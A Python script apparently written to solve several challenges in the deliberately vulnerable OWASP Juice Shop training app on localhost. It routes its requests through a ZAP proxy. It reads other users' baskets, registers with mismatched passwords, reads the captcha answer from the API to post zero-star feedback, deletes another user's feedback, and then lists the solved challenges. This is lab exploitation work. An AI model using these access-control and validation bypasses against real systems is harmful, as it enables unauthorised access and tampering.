from zapv2 import ZAPv2
import requests
import json

zap = ZAPv2()
proxy = zap._ZAPv2__proxies
root = "http://localhost:3000"
headers = {'Content-Type': 'application/json'}

zap.urlopen("%s/rest/basket/1" % root)
zap.urlopen("%s/rest/basket/2" % root)

payload = {
  "email":"test@testz.com",
  "password":"testest",
  "passwordRepeat":"testtest",
  "securityQuestion":{
    "id":1,
    "question":"Your eldest siblings middle name?",
    "createdAt":"2018-11-07T21:19:32.395Z",
    "updatedAt":"2018-11-07T21:19:32.395Z"
  },
  "securityAnswer":"test"
}
data = requests.post("%s/api/Users/" % root, headers=headers, proxies=proxy, verify=False, data=json.dumps(payload)).json()
print(data)

payload = {"email":"test@test.com","password":"testest"}
data = requests.post("%s/rest/user/login" % root, headers=headers, proxies=proxy, verify=False, data=json.dumps(payload)).json()
print(data)
token = data['authentication']['token']
headers['Authorization'] =  'Bearer ' + token

print(headers)

captcha = requests.get("%s/rest/captcha/" % root, proxies=proxy, verify=False, headers=headers).json()
print(captcha)
data = requests.post("%s/api/Feedbacks/" % root, headers=headers, proxies=proxy, verify=False, data=json.dumps({
  "comment":"Comment?",
  "rating":0,
  "captcha":captcha["answer"],
  "captchaId":captcha["captchaId"]
})).json()
print(data)

print(requests.delete("%s/api/Feedbacks/1" % root, proxies=proxy, verify=False, headers=headers).text)

print("")
print("[!] Challenges")
data = requests.get("%s/api/Challenges/" % root,headers=headers, proxies=proxy, verify=False).json()
solved = [c for c in data['data'] if c['solved']]

for s in solved:
  print(" - " + s['name'])